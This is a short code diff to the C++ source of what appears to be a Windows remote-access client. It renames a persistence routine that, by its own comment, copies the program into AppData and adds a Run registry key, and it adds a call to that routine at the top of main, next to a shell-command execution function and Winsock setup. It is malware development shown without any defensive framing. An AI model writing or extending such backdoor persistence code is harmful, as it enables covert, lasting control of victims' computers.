@@ -26,7 +26,7 @@ std::string execCommand(const std::string& cmd) {
 }
 
 //persistance setup copies itself to Appdata and Run key
-void addPersistance(){
+void addPersistence(){
     char appDataPath[MAX_PATH];
     SHGetFolderPathA(NULL , CSIDL_APPDATA , NULL , 0 , appDataPath);
 
@@ -55,6 +55,8 @@ void addPersistance(){
 
 int main() {
     std::cerr << "[*] Starting client\n";
+
+    addPersistence();
 
     WSADATA wsaData;
     int wsInit = WSAStartup(MAKEWORD(2, 2), &wsaData);
